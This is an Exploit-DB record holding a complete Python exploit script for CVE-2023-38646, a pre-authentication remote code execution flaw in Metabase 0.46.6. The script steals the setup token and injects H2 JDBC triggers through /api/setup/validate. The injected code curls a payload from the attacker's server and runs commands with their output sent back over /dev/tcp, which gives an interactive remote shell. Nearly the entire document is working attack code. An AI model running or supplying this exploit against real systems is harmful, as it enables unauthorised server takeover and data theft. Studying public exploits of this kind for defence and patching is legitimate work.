{"source": "https://www.exploit-db.com/exploits/51797", "vulnName": "Metabase 0.46.6 - Pre-Auth Remote Code Execution", "vulnEDBID": "51797", "vulnCVE": "N/A", "author": "MUSYOKA IAN", "exploitType": "WEBAPPS", "platform": "LINUX", "datePublished": "2024-02-15", "vulnContent": "# Exploit Title: metabase 0.46.6 - Pre-Auth Remote Code Execution\n# Google Dork: N/A\n# Date: 13-10-2023\n# Exploit Author: Musyoka Ian\n# Vendor Homepage: https://www.metabase.com/\n# Software Link: https://www.metabase.com/\n# Version: metabase 0.46.6\n# Tested on: Ubuntu 22.04, metabase 0.46.6\n# CVE : CVE-2023-38646\n\n#!/usr/bin/env python3\n\nimport socket\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom typing import Any\nimport requests\nfrom socketserver import ThreadingMixIn\nimport threading\nimport sys\nimport argparse\nfrom termcolor import colored\nfrom cmd import Cmd\nimport re\nfrom base64 import b64decode\n\n\nclass Termial(Cmd):\n    prompt = \"metabase_shell > \"\n    def default(self,args):\n        shell(args)\n\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        global success\n        if self.path == \"/exploitable\":\n            \n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(f\"#!/bin/bash\\n$@ | base64 -w 0  > /dev/tcp/{argument.lhost}/{argument.lport}\".encode())\n            success = True\n\n        else:\n            print(self.path)\n            #sys.exit(1)\n    def log_message(self, format: str, *args: Any) -> None:\n        return None\n\nclass Server(HTTPServer):\n    pass\n\ndef run():\n    global httpserver\n    httpserver = Server((\"0.0.0.0\", argument.sport), Handler)\n    httpserver.serve_forever()\n\ndef exploit():\n    global success, setup_token\n    print(colored(\"[*] Retriving setup token\", \"green\"))\n    setuptoken_request = requests.get(f\"{argument.url}/api/session/properties\")\n    setup_token = re.search('\"setup-token\":\"(.*?)\"', setuptoken_request.text, re.DOTALL).group(1)\n    print(colored(f\"[+] Setup token: {setup_token}\", \"green\"))\n    print(colored(\"[*] Tesing if metabase is vulnerable\", \"green\"))\n    payload = {\n        \"token\": setup_token,\n        \"details\":\n        {\n            \"is_on_demand\": False,\n            \"is_full_sync\": False,\n            \"is_sample\": False,\n            \"cache_ttl\": None,\n            \"refingerprint\": False,\n            \"auto_run_queries\": True,\n            \"schedules\":\n            {},\n            \"details\":\n            {\n                \"db\": f\"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\nnew java.net.URL('http://{argument.lhost}:{argument.sport}/exploitable').openConnection().getContentLength()\\n$$--=x\\\\;\",\n                \"advanced-options\": False,\n                \"ssl\": True\n                },\n                \"name\": \"an-sec-research-musyoka\",\n                \"engine\": \"h2\"\n                }\n                }\n    timer = 0\n    print(colored(f\"[+] Starting http server on port {argument.sport}\", \"blue\"))\n    thread = threading.Thread(target=run, )\n    thread.start()\n    while timer != 120:\n        test = requests.post(f\"{argument.url}/api/setup/validate\", json=payload)\n        if success == True :\n            print(colored(\"[+] Metabase version seems exploitable\", \"green\"))\n            break\n        elif timer == 120:\n            print(colored(\"[-] Service does not seem exploitable exiting ......\", \"red\"))\n            sys.exit(1)\n\n    print(colored(\"[+] Exploiting the server\", \"red\"))\n    \n\n    terminal = Termial()\n    terminal.cmdloop()\n\n\ndef shell(command):\n    global setup_token, payload2\n    payload2 = {\n        \"token\": setup_token,\n        \"details\":\n        {\n            \"is_on_demand\": False,\n            \"is_full_sync\": False,\n            \"is_sample\": False,\n            \"cache_ttl\": None,\n            \"refingerprint\": False,\n            \"auto_run_queries\": True,\n            \"schedules\":\n            {},\n            \"details\":\n            {\n                \"db\": f\"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('curl {argument.lhost}:{argument.sport}/exploitable -o /dev/shm/exec.sh')\\n$$--=x\",\n                \"advanced-options\": False,\n                \"ssl\": True\n                },\n                \"name\": \"an-sec-research-team\",\n                \"engine\": \"h2\"\n                }\n                }\n    \n    output = requests.post(f\"{argument.url}/api/setup/validate\", json=payload2)\n    bind_thread = threading.Thread(target=bind_function, )\n    bind_thread.start()\n    #updating the payload\n    payload2[\"details\"][\"details\"][\"db\"] = f\"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash /dev/shm/exec.sh {command}')\\n$$--=x\"\n    requests.post(f\"{argument.url}/api/setup/validate\", json=payload2)\n    #print(output.text)\n\n\ndef bind_function():\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind((\"0.0.0.0\", argument.lport))\n        sock.listen()\n        conn, addr = sock.accept()\n        data = conn.recv(10240).decode(\"ascii\")\n        print(f\"\\n{(b64decode(data)).decode()}\")\n    except Exception as ex:\n        print(colored(f\"[-] Error: {ex}\", \"red\"))\n        pass\n    \n\n\nif __name__ == \"__main__\":\n    print(colored(\"[*] Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]\", \"magenta\"))\n    args = argparse.ArgumentParser(description=\"Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]\")\n    args.add_argument(\"-l\", \"--lhost\", metavar=\"\", help=\"Attacker's bind IP Address\", type=str, required=True)\n    args.add_argument(\"-p\", \"--lport\", metavar=\"\", help=\"Attacker's bind port\", type=int, required=True)\n    args.add_argument(\"-P\", \"--sport\", metavar=\"\", help=\"HTTP Server bind port\", type=int, required=True)\n    args.add_argument(\"-u\", \"--url\", metavar=\"\", help=\"Metabase web application URL\", type=str, required=True)\n    argument  = args.parse_args()\n    if argument.url.endswith(\"/\"):\n        argument.url = argument.url[:-1]\n    success = False\n    exploit()\n            "}